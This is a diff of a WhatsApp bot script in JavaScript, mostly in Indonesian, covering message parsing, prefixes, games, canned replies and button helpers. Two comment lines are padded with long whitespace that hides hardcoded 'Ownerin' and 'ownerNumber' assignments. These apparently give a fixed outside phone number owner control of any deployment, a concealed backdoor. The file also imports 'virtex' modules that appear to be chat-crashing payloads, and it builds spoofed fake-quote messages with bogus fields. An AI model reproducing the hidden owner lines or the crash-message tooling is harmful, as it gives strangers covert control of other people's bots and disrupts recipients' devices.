+const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
+const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
+const voting = JSON.parse(fs.readFileSync('./lib/voting.json'))
+const { addVote, delVote } = require('./lib/vote')
+const { hentong, sewabot, donasi, help, info1} = require('./message')
+const { msgFilter, addSpam, unSpam, SpamExpired, cekSpam} = require('./lib/antispam')
+const { uploadFile1Day, uptotele, uploadImages } = require('./lib/uploadimage') 
+const { TelegraPh, UploadFileUgu } = require('./lib/uploader') 
+const textpro = require('./lib/textpro')
+const simple = require("./lib/simple.js");
+const { wikiSearch } = require('./lib/wiki.js')
+const _prem = require("./lib/premium");
+const _sewa = require('./lib/sewa')
+const game = require("./lib/game");
+const { isTicTacToe, getPosTic } = require("./lib/tictactoe");
+const tictac = require("./lib/tictac");
+const { addAutoClear,autoClearChat,checkAutoClear, checkDataName, createDataId, getDataId, addDataId, removeDataId, checkDataId, checkClaim, getClaim, expiredClaim, addUserClaim, getHit, cmdAdd, expiredCmd } = require("./lib/totalcmd");
+const { pinterest, wallpaper, wikimedia, quotesAnime } = require('./lib/scraper') 
+
+const { bad, menu, tekssalah, katahai, katamalem, katasiang, katasore, katalopyou, tekscmd, teksspam, ilhamberkata, ngebucin, badud, ohayo, salam, thanks, anime} = require("./message/messages.js");
+const translate = require('./lib/translate')
+const {getDateId, resetLevelingXp, userXp, userLeveling, getLevelingXp, getLevelingLevel, getLevelingId, addLevelingXp, addLevelingLevel, addUserId } = require("./lib/user");
+const { gethitUser, checkHit, AddHit, isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/user");
+
+
+
+//hasil editan sendiri
+const {addDb, clearAllDb, addCommands, checkCommands, deleteCommands } = require('./lib/commands')
+const { addBadword, delBadword, isKasar, addCountKasar, isCountKasar, delCountKasar } = require("./lib/badword.js");
+const { clearAllBan, addBanned, unBanned, cekBannedUser } = require("./lib/banned")
+const { addBlock, unBlock, cekBlock } = require("./lib/blockuser");
+const { addError, deleteError, checkError } = require("./lib/totalerror");
+const { addblockcmd, deleteblockcmd, checkblockcmd } = require("./lib/blockcmd");
+const { ucapsalamikum, enggakmau, ucapmalam, ucapsiang, ucappagi, botz, unregister, ucaphai, toxicbro, spamnih, loplop } = require("./message/ninamess");
+
+
+ //------------------ VIRTEX FILE ------------------\\
+//virtex by tsukasa
+const { virtex, virtag, philip, emoji1, emoji2, virtex2, virtex3, virtex4, virtex5, virtex8, virtex9, virtex10, virtex11, virtex12, slayer, ngazap, virtexbytsukasa } = require('./virtex/virtex.js')
+const { virtex6 } = require('./virtex/virtex6.js')
+const { virtex7 } = require('./virtex/virtex7.js')
+const { antivirus } = require('./virtex/antivirus.js')
+
+           
+
+ //------------------ JSON FILE ------------------\\
+const { _scommand, commandsDB, setiker, audionye, bancht, senbadword, ban } = require("./message/jsonfile");
+const { listcmdblock, welkom, settings, listerror, premium, _claim, sewa, user } = require("./message/jsonfile");
+const { blocked,hitnya } = require("./message/jsonfile");
+const AntiSpam = JSON.parse(fs.readFileSync('./database/antispam.json'))
+const DataId = JSON.parse(fs.readFileSync('./database/data.json'))
+const Dashboard = JSON.parse(fs.readFileSync('./database/dashboard.json'))
+
+
+ //******************* STICKER PACK ********************\\
+const { gaboleh, spam1, spam2, istigfar, hanyaadmin, jadiinadmin, ucapsalam, samasama, kumsalam } = require("./message/stickerPack.js");
+
+ //******************* FILE PHOTO ********************\\
+const virgam = fs.readFileSync('./stik/virgam.jpeg'),
+ davizin = fs.readFileSync('./stik/davizinmaker.jpg'),
+ girl = fs.readFileSync('./stik/trava.jpg'),
+ thumb = fs.readFileSync('./stik/thumb.jpeg'),
+ fakethumbnail = fs.readFileSync('./stik/fake.jpeg');
+
+
+
+explain = settings.explain
+global.Anticall = settings.Anticall
+fake1 = settings.copyright
+namalu = settings.namalu
+publik = settings.publik
+namaDocument = settings.namaDocument
+ephemeral = false
+totalForward = settings.totalForward
+prefa = settings.setPrefix.prefix
+multi = settings.setPrefix.multi
+onepref  = settings.setPrefix.onepref
+forwarding = settings.forwarding
+nopref = settings.setPrefix.nopref
+allpref = false
+offline = false
+autoblockcmd = settings.autoblockcmd
+autobio = settings.autobio
+typing= settings.typing
+autoread = settings.autoread
+autovn = settings.autovn
+antibugtroli = settings.antitroli
+nomerOwner = settings.nomerlu
+nomerbot = settings.nomerbot
+fake = settings.namabot
+let tebakgambar = []; 
+let family100 = []; 
+let mtk = []; 
+let tebaklirik = [];  
+let siapaaku = [];
+let tebakkata = [];
+let tebakkimia = [];
+let tebakbendera = [];
+let tebakanime = [];
+let caklontong = []
+let caklontong1 = []
+let nsfw = []
+let siminya = []
+waktu = '-'
+alasan = '-'
+let tictactoe = [];
+jeda = false
+gamewaktu = settings.gamewaktu
+limitCount = settings.limitCount
+teksChat = settings.antiPrivateChat.teksChat
+chatBot = settings.antiPrivateChat.chatBot
+gender = settings.gender
+autosticker = settings.autosticker
+autorespon = settings.autorespon 
+copyright = `© ${fake1}`
+Loading = settings.Loading 
+
+autoWelcome = settings.setWelcome.autoWelcome        
+
+AutoClearChat = settings.AutoClearChat
+autoReport = true
+
+setBc = settings.setBc
+replyType = settings.setReply
+
+
+jumlahTroli = settings.jumlahTroli
+
+Qoted = settings.setQuoted
+docType = "docx"
+setmenu = settings.setMenu
+
+const On =`ᴏɴ`
+const Off =`ᴏғғ`
+Myprofile = `ᴍʏ ᴘʀᴏғɪʟᴇ`
+Mainlagi = `ᴍᴀɪɴ ʟᴀɢɪ`
+const extream = ["6285156137901-1632578387@g.us","6285156137901-1633160194@g.us"]
+badword = ["asu","Asu","asw","Asw","Ajg","ajg","Anjing","anjing","Bajingan","bajingan","Bjingan","bjingan","Babi","babi","Bacot","bacot","Bcot","bcot","Cacat","cacat","Jancok","jancok","Jncok","jncok","Kontol","kontol","Kntl","kntl","KONTOL","kirek","Kirek","Lonte","lonte","Lnte","lnte","Memek","memek","Mmek","mmek","Pler","pler","Silet","Silit","silit","Silet","Tai","tai","Taek","taek","coeg"]
+//Masukan semua fitur ke sini, biar ke add ke dasboard
+features =["igstalk","menu","ytmp4","ytmp3","play","tiktok","tiktoknowm","ig","igstory","twitter","gitclone","toimg","tomp3", "toptt","slow", "togif", "tovideo","fast", "reverse","pastebin","hode","imut","nightcore","ghost","volume","triggered","wasted","smeme","comrade","horny","blur","pixelate","simpcard","lolice","glass"] 
+zenzkey = "officialdittaz"
+
+
+autoLevel = settings.autoLevel    
+
+const addCmd = (id, command) => {
+    const obj = { id: id, chats: command }
+    _scommand.push(obj)
+    fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
+}
+
+const getCommandPosition = (id) => {
+    let position = null
+    Object.keys(_scommand).forEach((i) => {
+        if (_scommand[i].id === id) {
+            position = i
+        }
+    })
+    if (position !== null) {
+        return position
+    }
+}
+
+const getCmd = (id) => {
+    let position = null
+    Object.keys(_scommand).forEach((i) => {
+        if (_scommand[i].id === id) {
+            position = i
+        }
+    })
+    if (position !== null) {
+        return _scommand[position].chats
+    }
+}
+
+const checkSCommand = (id) => {
+    let status = false
+    Object.keys(_scommand).forEach((i) => {
+        if (_scommand[i].id === id) {
+            status = true
+        }
+    })
+    return status
+}
+
+
+
+
+
+   
+
+
+/*           Recodenya yang teliti ya sayang                                                                              */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Ownerin ="6285156137901@s.whatsapp.net"
+/*           ntar klo error jangan salahin gua                                                               */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ownerNumber = [`6285156137901@s.whatsapp.net`,`${nomerOwner}@s.whatsapp.net`,`${nomerbot}@s.whatsapp.net`]
+//=================================================//
+module.exports = xdev = async (xdev, dev, baterai) => {
+	try {
+        if (!dev.hasNewMessage) return 
+        dev = dev.messages.all()[0]
+		if (!dev.message) return                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
+		if (dev.key && dev.key.remoteJid == 'status@broadcast') return
+		const m = simple.smsg(xdev, dev);   
+        dev.message = (Object.keys(dev.message)[0] === 'ephemeralMessage') ? dev.message.ephemeralMessage.message : dev.message        
+        me = xdev.user
+        const antibot = m.isBaileys
+        const content = JSON.stringify(dev.message)
+		const from = dev.key.remoteJid
+		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
+		const type = Object.keys(dev.message)[0]        
+		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
+		//const cmd = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
+		const cmd =    (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('hex'))         !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
+        var pes = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : ''
+        const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
+        const messagesC = pes.slice(0).trim()
+       
+    
+      if (multi){
+	  var prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
+	  var thePrefix = "Multi Prefix"
+      } else if (nopref){
+      var  prefix = ''
+      var thePrefix ="No prefix"
+      } else if (allpref){
+      var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : ''
+      var thePrefix ="All Prefix"
+      } else {
+      prefix = prefa
+      var thePrefix = prefa
+      }
+        
+        //const body = (type === 'conversation' && dev.message.conversation.startsWith(prefix)) ? dev.message.conversation : (type == 'imageMessage') && dev.message[type].caption.startsWith(prefix) ? dev.message[type].caption : (type == 'videoMessage') && dev.message[type].caption.startsWith(prefix) ? dev.message[type].caption : (type == 'extendedTextMessage') && dev.message[type].text.startsWith(prefix) ? dev.message[type].text : (type == 'listResponseMessage') && dev.message[type].singleSelectReply.selectedRowId ? dev.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && dev.message[type].selectedButtonId ? dev.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(dev.message[type].fileSha256.toString('base64')) !== null && getCmd(dev.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message[type].fileSha256.toString('base64')) : ""
+        const body = (type === 'listResponseMessage' && dev.message.listResponseMessage.title) ? dev.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && dev.message.buttonsResponseMessage.selectedButtonId) ? dev.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && dev.message.conversation.startsWith(prefix)) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption.startsWith(prefix) ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption.startsWith(prefix) ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text.startsWith(prefix) ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) : ""
+		const budy = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
+        const selectedButton = (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedButtonId : ''
+        const responseButton = (type == 'listResponseMessage') ? dev.message.listResponseMessage.title : ''                        
+		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
+		const args = body.trim().split(/ +/).slice(1)
+		const isCmd = body.startsWith(prefix)
+		const q = args.join(' ')
+        const c = args.join(" ")
+		const timeWib = moment().tz('Asia/Jakarta').format('HH:mm:ss')
+		const timeWit= moment().tz('Asia/Makassar').format('HH:mm:ss')
+        const timeWita = moment().tz('Asia/Jayapura').format('HH:mm:ss')
+		const botNumber = xdev.user.jid
+		const botNumberss = xdev.user.jid + '@c.us'
+		const isGroup = from.endsWith('@g.us')
+		const sender = dev.key.fromMe ? xdev.user.jid : isGroup ? dev.participant : dev.key.remoteJid
+		const senderNumber = sender.split("@")[0] 
+		const isOwner = ownerNumber.includes(sender)
+		const theOwner = sender == Ownerin
+		const totalchat = await xdev.chats.all()
+		const groupMetadata = isGroup ? await xdev.groupMetadata(from) : ''
+		const groupName = isGroup ? groupMetadata.subject : ''
+		const groupId = isGroup ? groupMetadata.jid : ''
+		const groupMembers = isGroup ? groupMetadata.participants : ''
+		const groupDesc = isGroup ? groupMetadata.desc : ''
+		const groupOwner = isGroup ? groupMetadata.owner : ''
+		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
+        const conts = dev.key.fromMe ? xdev.user.jid : xdev.contacts[sender] || { notify: jid.replace(/@.+/, '') }
+        const pushname = dev.key.fromMe ? xdev.user.name : conts.notify || conts.vname || conts.name || '-'
+        chatss = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
+        const forward = { forwardingScore: totalForward, isForwarded: forwarding, sendEphemeral: ephemeral}
+        
+   
+        const isHit = checkHit(senderNumber, user)   
+        const timestampp = speed();
+	    const latensi = speed() - timestampp
+        const arg = budy.slice(command.length + 2, budy.length)
+        const atibot = dev.isBaileys
+        const gcounti = settings.gcount
+        const itsMe = dev.key.fromMe
+        const mentionByTag = type == "extendedTextMessage" && dev.message.extendedTextMessage.contextInfo != null ? dev.message.extendedTextMessage.contextInfo.mentionedJid : []
+        const mentionByReply = type == "extendedTextMessage" && dev.message.extendedTextMessage.contextInfo != null ? dev.message.extendedTextMessage.contextInfo.participant || "" : ""
+ 
+//User 
+const userLevel = getLevelingLevel(senderNumber, user)
+const userExp = getLevelingXp(senderNumber, user)
+const userId = getLevelingId(senderNumber, user)
+const amountExp = Math.floor(Math.random() * 10) + 50
+const requiredExp = 1000 * userLevel
+const userPersen = userExp/requiredExp*100
+const userVerified = getDateId(senderNumber, user)
+   
+//VN saat ada yg maggil bot
+const iyakak = botz[Math.floor(Math.random() * botz.length)]              
+const ucapbot = fs.readFileSync(iyakak)
+
+//Vn saat command tidak ditemukan
+const unreg = unregister[Math.floor(Math.random() * unregister.length)]              
+const gakada = fs.readFileSync(unreg)
+
+//VN saat ada yang toxic
+const anying = toxicbro[Math.floor(Math.random() * toxicbro.length)]              
+const astaga = fs.readFileSync(anying)
+
+//VN saat ada yg akses fitur owner
+const ahenggak = enggakmau[Math.floor(Math.random() * enggakmau.length)]              
+const gakmau = fs.readFileSync(ahenggak)
+
+//VN saat ada yg bilang selamat pagi
+const ay = ucappagi[Math.floor(Math.random() * ucappagi.length)]
+const oahyo = fs.readFileSync(ay)
+
+//VN saat ada yg bilang selamat malam
+const ayuk = ucapmalam[Math.floor(Math.random() * ucapmalam.length)]
+const oyasumi = fs.readFileSync(ayuk)
+
+//VN saat ada yg bilang selamat siang
+const yayuk = ucapsiang[Math.floor(Math.random() * ucapsiang.length)]
+const koniciwa = fs.readFileSync(yayuk)
+
+//VN saat ada yg spam
+const alal = spamnih[Math.floor(Math.random() * spamnih.length)]
+const nospam = fs.readFileSync(alal)
+
+//VN saat ada yg bilang halo
+const ulul = ucaphai[Math.floor(Math.random() * ucaphai.length)]
+const moshimos = fs.readFileSync(ulul)
+
+//VN saat ada yg bilang asalamualaikum
+const alul = ucapsalamikum[Math.floor(Math.random() * ucapsalamikum.length)]
+const walaikumsalam = fs.readFileSync(alul)
+
+//VN saat ada yg bilang i love u
+const awlu = loplop[Math.floor(Math.random() * loplop.length)]
+const lopyoutoo = fs.readFileSync(awlu)
+
+//Random nama anime
+const karakter = anime[Math.floor(Math.random() * anime.length)]
+
+//Teks untuk pertanyaan game yg salah
+const jawabansalah = tekssalah[Math.floor(Math.random() * tekssalah.length)]
+           
+const textcmd = tekscmd[Math.floor(Math.random() * tekscmd.length)]                         
+const textspam = teksspam[Math.floor(Math.random() * teksspam.length)]                         
+
+ 
+//Security / Keamanan
+const Toxic = checkDataId ("antibadword", from, DataId) 
+const isBanchat = checkDataId ("banchat", from, DataId) 
+const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
+const isGroupAdmins = groupAdmins.includes(sender) || false
+const isVote = isGroup ? voting.includes(from) : false
+const isAntiLink = checkDataId ("antilink", from, DataId) 
+const AntiVirtex = checkDataId ("antivirtex", from, DataId) 
+const isAntilinkGc = checkDataId ("antilinkgc", from, DataId) 
+const isAntihidetag = checkDataId ("antihidetag", from, DataId) 
+const isAntiviewonce = checkDataId ("antivo", from, DataId) 
+const isKickarea = checkDataId ("antiasing", from, DataId) 
+const isWelkom = isGroup ? JSON.parse(fs.readFileSync('./database/welkom.json')).includes(from) : false
+const isExtream = isGroup ? extream.includes(from) : false
+const isSimi = isGroup ? siminya.includes(from) : false
+const isAntidel = isGroup ? xdev.antidel.includes(from) : false
+const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
+const gcount = isPremium ? gcounti.prem : gcounti.user
+
+//Auto READ   
+if(autoread){
+xdev.chatRead(from, "read").catch(_ => _)
+}
+
+//-------------------- 》MESSGAGE RESPON《 --------------------\\
+ 
+if(senderNumber.startsWith("62")){
+var mess = {
+wait: 'Tunggu sebentar ya kak',
+search: 'Searching...',
+scrap: '*Scrapping...*',
+success: 'Berhasil!',
+limit: `[❕] Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`,
+claimOn: `Kamu sudah melakukan claim sebelumnya, Harap claim lagi pada jam ${getClaim(senderNumber, _claim)}.`,
+wrongFormat: 'Format salah, coba liat lagi di menu',
+
+error: {
+stick: 'bukan sticker itu:v',
+api: 'Error api atau linkya mungkin',
+Iv: 'Linknya error:v',
+link : "Link error!"
+},
+
+block:{
+Bowner: `Maaf kak command ${command} telah di block oleh owner`,
+Bsystem: `Command ${command} telah di block oleh system karena terjadi error`
+},
+
+ only: {
+prem : 'Premium special features! Chat owner to get Premium access!',
+group: 'Fitur ini dapat digunakan di Dalam Group!',
+ownerB: 'Fitur Khusus Owner Bot!',
+admin: 'Fitur dapat Digunakan oleh Admin Group!',
+Badmin: 'Fitur dapat Digunakan Setelah Bot menjadi ADMIN!'
+ }
+ }
+
+} else {
+	
+//BAHASA ENGLISH
+var mess = {
+wait: 'Please Wait a second',
+search: 'Searching...',
+scrap: 'Scrapping...',
+success: 'Success!',
+limit: `[❕] your limit has run out, please type ${prefix}limit for check your limit`,
+eror: 'There somethings wrong\nPlease try again later or contact to the developer',
+claimOn: `You have made a claim before, Please claim again at hours ${getClaim(senderNumber, _claim)}.`,
+wrongFormat: 'Format is wrong',
+
+error: {
+stick: 'That is not sticker :v',
+api: 'Error api atau linkya mungkin',
+Iv: 'Linknya error:v',
+link : "Link error!"
+},
+
+block:{
+Bowner: `Sorry, the command「 *${command}* 」has been blocked by the owner`,
+Bsystem: `Sorry, the command「 *${command}* 」has been blocked by the system due to an error`
+},
+
+only: {
+prem : 'Premium special features! Chat owner to get Premium access!',
+group: 'This features can be used in the group!',
+ownerB: 'This feature can be used only for bot owner!',
+admin: 'This feature can be used only for group admin!',
+Badmin: 'This feature can be used after the bot becomes admin!'
+ }
+ }
+
+
+}            
+
+//-------------------- 》AKHIR MESSGAGE RESPON《 --------------------\\
+
+
+
+//Ucapan Waktu  
+if(timeWib < "23:59:00"){ var ucapanWaktu = 'Selamat malam' }
+if(timeWib < "19:00:00"){ var ucapanWaktu = 'Selamat malam'}
+if(timeWib < "18:00:00"){ var ucapanWaktu = 'Selamat sore'}
+if(timeWib < "15:00:00"){ var ucapanWaktu = 'Selamat siang'}
+if(timeWib < "11:00:00"){ var ucapanWaktu = 'Selamat pagi'}
+if(timeWib < "06:00:00"){ var ucapanWaktu = 'Selamat pagi'  }      
+        
+//FAKE REPLY  
+const ftoko = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./stik/fake.jpeg`)},"title": `${pushname}`,"description": `${ucapanWaktu} kak`,"currencyCode": "IDR", "priceAmount1000": `${getBalance(senderNumber, user)}`, "retailerId": `Rp10`,"productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
+const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
+const ftext = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/fake.jpeg')}}}
+const ftroli = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : jumlahTroli, status: 1,surface : 2,message: `${fake}\n${ucapanWaktu} kak`,orderTitle: `${ucapanWaktu} kak`,thumbnail: fs.readFileSync('./stik/thumb.jpeg'), sellerJid: `0@s.whatsapp.net`}}}
+const fsticker = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},"message": {"stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc","fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=","fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=","mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73","fileLength": "7186","mediaKeyTimestamp": "1622815545","isAnimated": false}}}
+const fvn = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds": "9999999","ptt": "true"}}}
+const floc = { key: {"fromMe": false,"participant": `0@s.whatsapp.net`, "remoteJid": "6289530863358-1621036495@g.us" },message: { "liveLocationMessage": { "title":`${fake}`,}}}
+const fvideo = { key: {fromMe: false,participant: `62895619083555@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '-99999', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
+const fgc = { key: {"fromMe": false,"participant": "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "62895619083555-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "P", "caption": `${fake}`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
+const fgif = { key: {fromMe: false,participant: `6285842369183@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}} 
+const fimage = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: {"imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": fake, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg'), "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
+                
+
+
+//Set Quoted
+if(Qoted === "ftoko"){
+var setQuoted = ftoko
+} else if(Qoted === "fkontak"){
+var setQuoted = fkontak
+} else if(Qoted === "ftext"){
+var setQuoted = ftext
+}else if(Qoted === "ftroli"){
+var setQuoted = ftroli
+} else if(Qoted === "fsticker"){
+var setQuoted = fsticker
+} else if(Qoted === "fvn"){
+var setQuoted = fvn
+} else if(Qoted === "floc"){
+var setQuoted = floc
+}else if(Qoted === "fvideo"){
+var setQuoted = fvideo
+} else if(Qoted === "fgc"){
+var setQuoted = fgc
+} else if(Qoted === "fgif"){
+var setQuoted = fgif
+} else if(Qoted === "fimage"){
+var setQuoted = fimage
+} else if(Qoted === "dev"){
+var setQuoted = dev
+}
+
+
+
+//SetReply
+const setReply = async(teks) =>{
+if(replyType === "web"){
+xdev.sendMessage(from, teks, text, { quoted: dev, contextInfo: { forward, externalAdReply:{title: `${fake}`,body:`${week} ${calender}`,previewType:"PHOTO",thumbnail: fs.readFileSync('./stik/reply.jpg'), sourceUrl:`http://wa.me/${Ownerin.split("@")[0]}`}}})
+} else if(replyType === "troli"){
+var yakult = xdev.prepareMessageFromContent(from, {
+'orderMessage': {
+'orderId': '0@s.whatsapp.net',
+'thumbnail': fs.readFileSync('./stik/reply.jpg'),
+'itemCount': jumlahTroli,
+'status': 1,
+'surface': 1,
+'message':teks,
+'orderTitle': fake,
+'sellerJid': `0@s.whatsapp.net`,
+'token': 'notoken',
+}
+}, {
+'quoted': dev,
+'contextInfo': forward
+});
+xdev.relayWAMessage(yakult)  
+} else if(replyType === "mess"){
+xdev.sendMessage(from, teks, text, { quoted: dev });
+} else if(replyType === "quoted"){
+xdev.sendMessage(from, teks, text, { quoted: setQuoted });
+} else  if(replyType === "video"){
+xdev.sendMessage(from, teks, text, { quoted: dev, contextInfo: { externalAdReply: { title: `${fake}`, body: `${copyright}`, thumbnailUrl: '', thumbnail: thumb, mediaType:"2", previewType: "VIDEO", mediaUrl: "https://youtu.be/nLEYHaaB6x0"}}})
+} else {
+xdev.sendMessage(from, "Error SetReply Tidak Di Temukan", text)
+}
+}
+            
+//SENDKONTAK
+const sendKontak = (from, nomor, nama, org = "") => {
+const vcard ="BEGIN:VCARD\n" +"VERSION:3.0\n" + "FN:" +nama +"\n" +"ORG:" + org + "\n" +"TEL;type=CELL;type=VOICE;waid=" +nomor + ":+" +nomor +"\n" +"END:VCARD";
+xdev.sendMessage(from, { displayname: nama, vcard: vcard }, MessageType.contact,{ quoted: dev });
+};
+
+//******************* 》BUTTON CMD《 ********************\\
+   
+///Button Text
+const sendButMessage = (id, text1, desc1, but = []) => {
+const buttonMessage = {
+contentText: text1,
+footerText: desc1,
+buttons: but,
+headerType: 1,
+}
+xdev.sendMessage(id, buttonMessage, MessageType.buttonsMessage, {quoted: setQuoted})
+}
+
+///Button Image
+const sendButImage = async(id, text1, desc1, gam1, but = [], options1 = {}) => {
+kma = gam1
+mhan = await xdev.prepareMessage(from, kma, image)
+locmhan = mhan.message["ephemeralMessage"] ? mhan.message.ephemeralMessage : mhan
+const buttonMessages = {
+imageMessage: locmhan.message.imageMessage,
+contentText:  text1,
+footerText: desc1,
+buttons: but,
+headerType: 4
+}
+xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options1)
+}
+
+///Button Video
